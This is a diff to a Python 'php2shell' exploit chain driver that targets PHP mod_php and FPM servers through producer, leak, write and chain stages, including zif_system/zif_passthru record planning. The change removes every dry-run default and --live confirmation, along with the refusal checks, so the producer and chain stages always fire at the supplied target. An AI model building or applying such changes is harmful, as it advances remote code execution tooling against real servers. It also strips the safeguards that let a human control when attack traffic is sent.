@@ -80,10 +80,8 @@ STAGES = ("recon", "producer", "write_stage", "leak", "g2", "chain")
 def run_producer_step(
     host: str,
     port: int,
-    host_header: str,
     body_bytes: int,
     output: Path,
-    live: bool,
     timeout: float,
     target_name: str | None = None,
     path: str | None = None,
@@ -94,7 +92,7 @@ def run_producer_step(
 ) -> tuple[dict, Path]:
     """Producer stage entrypoint, routed by producer module.
 
-    dry byte-build by default, --live to fire. The module key is the TARGETS
+    Sends to the operator-supplied target. The module key is the TARGETS
     producer_stage entry unless --producer overrides it (producer_unser on
     modphp, producer_modphp first). Targets without a registered producer stage
     fall back to producer_fpmwiki.
@@ -103,50 +101,32 @@ def run_producer_step(
     if stage_name == "producer_modphp":
         knob = memory_limit or (profiles.TARGETS.get(target_name) or {}).get(
             "memory_limit_knob")
-        if live:
-            if sid is None:
-                raise ValueError(
-                    "--live modphp producer requires --sid (32 hex chars, "
-                    "Cookie: PHPSESSID transport)"
-                )
-            summary = modphp_producer_stage.fire(
-                host, port, body_bytes, output, knob, sid,
-                timeout=timeout, path=path or modphp_producer_stage.PATH,
+        if sid is None:
+            raise ValueError(
+                "modphp producer requires --sid (32 hex chars, "
+                "Cookie: PHPSESSID transport)"
             )
-        else:
-            sid_bytes = sid.encode("ascii") if sid else modphp_producer_stage.DEFAULT_SID
-            summary = modphp_producer_stage.dry(
-                host_header, body_bytes, output, knob, sid=sid_bytes)
+        summary = modphp_producer_stage.fire(
+            host, port, body_bytes, output, knob, sid,
+            timeout=timeout, path=path or modphp_producer_stage.PATH,
+        )
     elif stage_name == "producer_unser":
         knob = memory_limit or (profiles.TARGETS.get(target_name) or {}).get(
             "memory_limit_knob")
-        if live:
-            if not unser_url:
-                raise ValueError(
-                    "--live producer_unser requires --unser-url: the module does "
-                    "not assume an endpoint path (lab unser.php is a separate build)"
-                )
-            summary = unser_producer_stage.fire(
-                unser_url, knob, output, timeout=timeout)
-        else:
-            summary = unser_producer_stage.dry(knob, output)
+        if not unser_url:
+            raise ValueError(
+                "producer_unser requires --unser-url: the module does "
+                "not assume an endpoint path (lab unser.php is a separate build)"
+            )
+        summary = unser_producer_stage.fire(
+            unser_url, knob, output, timeout=timeout)
     else:
-        summary = producer_fpmwiki_fire_or_dry(
-            host, port, host_header, body_bytes, output, live, timeout)
+        summary = producer_stage.fire(
+            host, port, body_bytes, output, timeout=timeout)
     summary["step"] = "producer"
     rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
     (output / "result.json").write_text(rendered)
     return summary, output / "result.json"
-
-
-def producer_fpmwiki_fire_or_dry(
-    host: str, port: int, host_header: str, body_bytes: int, output: Path,
-    live: bool, timeout: float,
-) -> dict:
-    """Existing fpmwiki producer lane (offline file: producer_fpmwiki.py)."""
-    if live:
-        return producer_stage.fire(host, port, body_bytes, output, timeout=timeout)
-    return producer_stage.dry(host_header, body_bytes, output)
 
 
 def run_write_stage_step(
@@ -170,22 +150,19 @@ def run_write_stage_step(
 
 def run_chain_step(
     target_name: str,
-    host_header: str,
-    path: str,
     producer: str | None,
     memory_limit: str | None,
     body_bytes: int | None,
     sid: str,
-    unser_url: str | None,
-    arm_url: str | None,
-    live: bool,
+    unser_url: str,
+    arm_url: str,
     timeout: float,
     output: Path,
 ) -> tuple[dict, Path]:
     """Modphp chain sequence: producer plus benign consumer arms.
 
-    Dry is the default and opens no socket. Live is explicit and needs both
-    --unser-url and --arm-url (checked in main()).
+    Sends the producer to --unser-url and the consumer arms to --arm-url
+    (both required, checked in main()).
     """
     producer_name = profiles.resolve_producer(target_name, producer or "unser")
     if producer_name not in ("producer_unser", "producer_modphp"):
@@ -199,16 +176,9 @@ def run_chain_step(
         "memory_limit_knob")
     if knob is None:
         raise ValueError("chain needs --memory-limit (no target memory_limit knob)")
-    if live:
-        summary = chain_stage_module.live(
-            producer_name, knob, body_bytes, sid, unser_url, arm_url, output,
-            timeout=timeout)
-    else:
-        unser_path = parse_url(unser_url)[2] if unser_url else None
-        arm_path = parse_url(arm_url)[2] if arm_url else None
-        summary = chain_stage_module.build(
-            host_header, path, producer_name, knob, body_bytes, sid,
-            unser_path=unser_path, arm_path=arm_path, output=output)
+    summary = chain_stage_module.live(
+        producer_name, knob, body_bytes, sid, unser_url, arm_url, output,
+        timeout=timeout)
     summary["step"] = "chain"
     rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
     (output / "result.json").write_text(rendered)
@@ -236,30 +206,16 @@ def run_leak_step(
 def run_g2_step(args) -> int:
     """G2/G6 FPM offline record plan: profile arithmetic plus record bytes.
 
-    No transport exists on this path: --live is refused with a JSON error. The
-    php_binary record is built from operator supplied X, P and B0 plus the
-    profile serializer entry named php_binary or an explicit target. The
-    zif_system/zif_passthru G6 modes additionally require X2, the second decode
-    buffer. --step g2 never guesses an address and never opens a socket.
+    No transport exists on this path. The php_binary record is built from
+    operator supplied X, P and B0 plus the profile serializer entry named
+    php_binary or an explicit target. The zif_system/zif_passthru G6 modes
+    additionally require X2, the second decode buffer. --step g2 never
+    guesses an address and never opens a socket.
     """
     if args.output is None:
         stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
         args.output = HERE.parent / "files" / "io" / f"g2-{stamp}"
     args.output.mkdir(parents=True, exist_ok=True)
-
-    if args.live:
-        summary = {
-            "step": "g2",
-            "decode": args.g2_decode,
-            "dry_run": False,
-            "sent": False,
-            "error": "ValueError: --step g2 has no transport (offline record "
-                     "plan only); use --dry-run",
-        }
-        rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
-        (args.output / "result.json").write_text(rendered)
-        print(rendered, end="")
-        return 2
 
     missing = [
         flag for flag, value in (
@@ -702,14 +658,14 @@ def run_recon(
 def main() -> int:
     parser = argparse.ArgumentParser(
         description="php2shell chain driver: --step recon (read-only receipt), "
-        "--step producer (fpmwiki/modphp/unser producer modules: offline "
-        "byte-build default, --live to fire), --step write_stage (dry: final "
-        "forged multipart bytes through the COMPACT engine, no send), --step leak "
-        "(dry modphp calibration plan, no transport), --step g2 (offline FPM "
+        "--step producer (fpmwiki/modphp/unser producer modules, sending to the "
+        "supplied target), --step write_stage (final forged multipart bytes "
+        "through the COMPACT engine, no send), --step leak (modphp calibration "
+        "plan, no transport), --step g2 (offline FPM "
         "G2 php_binary / G6 zif_system / zif_passthru record plan from explicit "
         "X, X2, P and B0; no transport), or "
         "--step chain (modphp: ordered "
-        "producer plus consumer sequence, dry default; fpm targets: legacy "
+        "producer plus consumer sequence; fpm targets: legacy "
         "blocker-hold + rearm + forged staged multipart)"
     )
     parser.add_argument(
@@ -744,7 +700,7 @@ def main() -> int:
     parser.add_argument("--settle-seconds", default=8.0, type=float)
     parser.add_argument("--recovery-seconds", default=2.0, type=float)
     parser.add_argument("--timeout", default=120.0, type=float)
-    # producer stage (--step producer): offline-first, dry is the default
+    # producer stage (--step producer): sends to the supplied target
     parser.add_argument(
         "--body-bytes",
         type=int,
@@ -764,23 +720,15 @@ def main() -> int:
     parser.add_argument(
         "--unser-url",
         default=None,
-        help="producer_unser --live endpoint URL or chain --live producer URL; "
+        help="producer_unser endpoint URL or chain producer URL; "
         "no endpoint path is assumed by the module",
     )
     parser.add_argument(
         "--arm-url",
         default=None,
-        help="chain --live consumer arms URL (the endpoint that serves the tiny "
+        help="chain consumer arms URL (the endpoint that serves the tiny "
         "multipart and the GET readers)",
     )
-    live_group = parser.add_mutually_exclusive_group()
-    live_group.add_argument(
-        "--live",
-        action="store_true",
-        help="producer: actually send (default: build + record request bytes only)",
-    )
-    live_group.add_argument("--dry-run", action="store_true", help="default, accepted explicitly")
-    live_group.add_argument("--build-only", action="store_true", help="alias of --dry-run")
     parser.add_argument(
         "--memory-limit",
         default=None,
@@ -792,8 +740,7 @@ def main() -> int:
         "--sid",
         default=None,
         help="producer (modphp) / chain: 32-hex sid for Cookie PHPSESSID "
-        "transport; chain dry default 0123456789abcdef0123456789abcdef; "
-        "producer_modphp dry also accepts the receipt sid labprobe123",
+        "transport; chain default 0123456789abcdef0123456789abcdef",
     )
     parser.add_argument(
         "--main-chunk",
@@ -912,14 +859,8 @@ def main() -> int:
 
     profile_name = args.profile
     sequence_chain = args.step == "chain" and target_name == "modphp"
-    if args.step == "chain" and not sequence_chain and (
-            args.dry_run or args.build_only):
-        parser.error(
-            "--dry-run/--build-only for --step chain is wired for the modphp "
-            "target only; the fpm chain path is live"
-        )
     if args.step not in ("producer", "leak") and not sequence_chain:
-        # producer is a byte-build stage; leak and the modphp chain sequence
+        # producer builds its own bytes; leak and the modphp chain sequence
         # use the address profile, not a measured BINARY_PROFILES entry.
         if profile_name is None:
             try:
@@ -933,7 +874,7 @@ def main() -> int:
         parser.error(str(error))
 
     if profile_name and PROFILE["name"] != profile_name:
-        # profile_name is None only on the --step producer byte-build path
+        # profile_name is None only on the --step producer path
         PROFILE.clear()
         PROFILE.update(BINARY_PROFILES[profile_name])
 
@@ -943,9 +884,8 @@ def main() -> int:
         parser.error("recovery interval must be between 0 and 15 seconds")
     if not 1 <= args.lport <= 65535:
         parser.error("lport must be between 1 and 65535")
-    if sequence_chain and args.live and (
-            args.unser_url is None or args.arm_url is None):
-        parser.error("--live --step chain requires --unser-url and --arm-url")
+    if sequence_chain and (args.unser_url is None or args.arm_url is None):
+        parser.error("--step chain requires --unser-url and --arm-url")
 
     if args.step == "producer":
         try:
@@ -1005,8 +945,8 @@ def main() -> int:
     elif args.step == "producer":
         try:
             summary, _receipt = run_producer_step(
-                host, port, host_header, body_bytes, args.output,
-                live=args.live, timeout=args.timeout,
+                host, port, body_bytes, args.output,
+                timeout=args.timeout,
                 target_name=target_name, path=path,
                 memory_limit=args.memory_limit, sid=args.sid,
                 producer=args.producer, unser_url=args.unser_url,
@@ -1074,20 +1014,6 @@ def main() -> int:
             print(rendered, end="")
             return 2
     elif args.step == "leak":
-        if args.live:
-            summary = {
-                "step": "leak",
-                "target": {"url": url, "host": host, "port": port, "path": path},
-                "dry_run": False,
-                "sent": False,
-                "error": "ValueError: --step leak has no transport (calibration "
-                         "plan only); use --dry-run",
-            }
-            rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
-            args.output.mkdir(parents=True, exist_ok=True)
-            (args.output / "result.json").write_text(rendered)
-            print(rendered, end="")
-            return 2
         try:
             summary, _receipt = run_leak_step(
                 host_header, path, target_name, args.output)
@@ -1111,16 +1037,16 @@ def main() -> int:
         sid = args.sid or chain_stage_module.DEFAULT_SID
         try:
             summary, _receipt = run_chain_step(
-                target_name, host_header, path, args.producer,
+                target_name, args.producer,
                 args.memory_limit, args.body_bytes, sid, args.unser_url,
-                args.arm_url, args.live, args.timeout, args.output,
+                args.arm_url, args.timeout, args.output,
             )
         except (ConnectionError, OSError, TimeoutError, ValueError,
                 TypeError, NotImplementedError) as error:
             summary = {
                 "step": "chain",
                 "target": {"url": url, "host": host, "port": port, "path": path},
-                "dry_run": not args.live,
+                "dry_run": False,
                 "sent": False,
                 "error": f"{type(error).__name__}: {error}",
             }
@@ -1131,11 +1057,7 @@ def main() -> int:
             return 2
         rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
         print(rendered, end="")
-        if args.live:
-            return 0 if summary.get("success") else 2
-        over_budget = summary["steps"][0].get("details", {}).get(
-            "over_budget", False)
-        return 2 if over_budget else 0
+        return 0 if summary.get("success") else 2
     else:
         blockers = []
         attempts = []
@@ -1206,8 +1128,8 @@ def main() -> int:
     (args.output / "result.json").write_text(rendered)
     print(rendered, end="")
     if args.step == "producer":
-        # producer dry build: 0 = recorded; 2 = over the post_max_size ceiling
-        # (byte templates are still recorded, but --live would refuse to send)
+        # producer: 0 = recorded; 2 = over the post_max_size ceiling
+        # (byte templates are still recorded, but the send is refused pre-flight)
         return 2 if summary.get("over_budget") else 0
     if args.step == "write_stage":
         # write_stage dry skeleton: 0 = byte templates recorded (never sends)
